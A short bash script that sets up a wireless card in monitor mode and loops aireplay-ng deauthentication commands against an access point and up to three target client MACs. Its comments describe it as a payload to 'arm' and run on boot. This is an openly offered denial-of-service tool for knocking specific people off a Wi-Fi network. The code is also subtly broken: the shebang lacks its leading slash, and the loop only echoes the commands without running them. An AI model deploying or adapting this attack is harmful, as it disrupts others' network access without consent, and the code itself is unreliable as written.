#!bin/bash

# Kills any conflicting processes to free up space for aireplay
sudo airmon-ng check kill

# Makes sure the wireless interface for the Alfa card is selected
sudo airmon-ng start wlan0 

# Allows time for the device to configure itself
sleep 5

# Edit the CHANGE ME inside the AP MAC and Target MAC variables to reflect the AP MAC of the target, and the MAC of the target(s). 
# Then, delete the # prepending the variables in order to "arm" the script. The payload is considered "disarmed" until you do this. 
# Configure the script to run on boot and you're good to go.
#NOTE: If you have less than three targets, then you must comment out any excess lines in the items array using a #.

#AP_MAC="CHANGE ME"
#Target_MAC_ONE="CHANGE ME"
#Target_MAC_TWO="CHANGE ME"
#Target_MAC_THREE="CHANGE ME"

items=(
  "sudo aireplay-ng -0 0 -a $AP_MAC -c $Target_MAC_ONE -D wlan0" # Target MAC ONE
  "sudo aireplay-ng -0 0 -a $AP_MAC -c $Target_MAC_TWO -D wlan0" # Target MAC TWO
  "sudo aireplay-ng -0 0 -a $AP_MAC -c $Target_MAC_THREE -D wlan0" # Target MAC THREE
)

while true; do
  for item in "${items[@]}"; do 
    echo "Deauthenticating $item"
    sleep 3
  done
done
